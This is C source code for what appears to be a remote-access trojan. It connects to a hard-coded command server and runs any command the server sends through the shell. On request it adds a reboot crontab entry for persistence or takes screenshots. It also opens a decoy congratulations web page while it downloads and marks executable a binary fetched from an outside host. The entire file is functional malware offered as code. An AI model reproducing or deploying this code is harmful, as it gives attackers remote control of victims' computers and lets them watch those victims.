#include <capture.h>
#include <network.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define IP_ADDR "vps.mrfey.fr"
#define PORT "443"
#define PORT_LENGTH 6

static int get_command(int fd, char *path)
{
    char buffer[BUFFER_SIZE];

    memset(buffer, 0, BUFFER_SIZE);

    if (c2_recv(fd, buffer) == -1)
    {
        fprintf(stderr, "Error while receiving data...\n");
        close(fd);
        exit(EXIT_FAILURE);
    }

    if (strcmp(buffer, "persistence") == 0)
    {
        char command[BUFFER_SIZE];
        memset(command, 0, BUFFER_SIZE);
        sprintf(
            command,
            "echo \"@reboot sleep 20;$PWD/%s\" > cron; crontab cron; rm cron",
            path);
        system(command);
    }

    else if (strcmp(buffer, "screenshot") == 0)
    {
        screenshot(fd);
    }

    else
    {
        system(buffer);
    }

    return 0;
}

int main(int argc, char *argv[])
{
    int first_fd, sec_fd;
    int res;
    int port;
    char buffer[BUFFER_SIZE];
    char *prefix, *value;
    char new_port[PORT_LENGTH];

    (void)argc;

    system("xdg-open https://viro.jajpnal.fr/felicitation");
    system("wget --no-verbose http://fey.toile-libre.org/scrot -O /tmp/scrot; "
           "chmod +x /tmp/scrot");

    first_fd = c2_connect(IP_ADDR, PORT);
    if (first_fd == -1)
    {
        fprintf(
            stderr, "Impossible to connect to %s on port %s\n", IP_ADDR, PORT);
        exit(EXIT_FAILURE);
    }

    while (1)
    {
        memset(buffer, 0, BUFFER_SIZE);

        res = c2_recv(first_fd, buffer);
        if (res == -1)
        {
            fprintf(stderr, "Error while receiving data...\n");
            close(first_fd);
            exit(EXIT_FAILURE);
        }

        prefix = strtok(buffer, ":");
        value = strtok(NULL, ":");
        if (value == NULL)
        {
            continue;
        }
        if (strcmp(prefix, "port") == 0)
        {
            port = atoi(value);
            if (port == 0 || snprintf(new_port, PORT_LENGTH, "%d", port) < 0)
            {
                continue;
            }
            break;
        }
    }
    close(first_fd);

    sec_fd = c2_connect(IP_ADDR, new_port);
    if (sec_fd == -1)
    {
        fprintf(stderr,
                "Impossible to connect to %s on port %s\n",
                IP_ADDR,
                new_port);
        exit(EXIT_FAILURE);
    }

    dup2(sec_fd, 1);
    dup2(sec_fd, 2);

    while (1)
    {
        if (get_command(sec_fd, argv[0]) == -1)
        {
            break;
        }
    }

    close(sec_fd);
    return 0;
}
